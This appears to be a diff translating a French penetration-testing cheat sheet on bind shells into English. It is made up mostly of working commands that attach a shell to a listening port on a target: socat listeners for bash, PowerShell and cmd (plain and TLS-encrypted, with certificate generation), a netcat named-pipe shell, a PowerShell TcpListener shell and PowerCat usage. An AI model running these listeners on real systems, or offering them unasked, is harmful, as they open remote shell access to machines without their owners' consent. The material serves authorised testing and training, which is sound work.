@@ -1,43 +1,43 @@
 # Bind shell
 
-Se produisent lorsque le code exécuté sur la cible est utilisé pour démarrer un écouteur attaché à un shell directement sur la cible.
+Occur when code executed on the target is used to start a listener attached to a shell directly on the target.
 
-**NB: L'avantage de ne nécessiter aucune configuration sur votre propre réseau, mais peut être empêché par des pare-feu protégeant la cible.**
+**NB: The advantage of not requiring any configuration on your own network, but can be prevented by firewalls protecting the target.**
 
 
 ## Socat
 
-Demarrer un ecouteur de shell 
+Start a shell listener
 
 ```sh
 socat TCP-L:<PORT> EXEC:"/bin/bash"
 ```
 
 ```sh
-socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
 ```
 
-Connecter à l'auditeur en attente
+Connect to the waiting listener
 
 ```sh
-socat TCP:<TARGET-IP>:<PORT> -
+socat TCP:<TARGET-IP>:<PORT> -
 ```
 
-### Shell cryptées
+### Encrypted shells
 
-Générer un certificat afin d'utiliser des shells cryptés
+Generate a certificate to use encrypted shells
 
 ```sh
 openssl req --newkey rsa:2028 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
 ```
 
-Fusionner les deux fichiers en un seul 
+Merge the two files into one
 
 ```sh
 cat shell.key shell.crt > shell.pem
 ```
 
-Demarrer un ecouteur 
+Start a listener
 
 ```sh
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:"/bin/bash"
@@ -47,13 +47,13 @@ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:"/bin/bash"
 socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0,fork EXEC:cmd.exe,pipes
 ```
 
-Connecter à l'auditeur en attente:
+Connect to the waiting listener:
 
 ```sh
 socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
 ```
 
-### Shell communes
+### Common shells
 
 ```sh
 mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
@@ -63,9 +63,9 @@ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 nc -nv <TARGET-IP> <PORT>
 ```
 
-## PowerShell 
+## PowerShell
 
-Executer ceci dans powershell
+Execute this in powershell
 
 ```sh
 $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0', '443');
@@ -91,7 +91,7 @@ nc -nv <TARGET-IP> 443
 ```
 
 ## PowerCat
-C'est la version powershell de netcat
+It's the powershell version of netcat
 
 ```sh
 . .\powercat.ps1
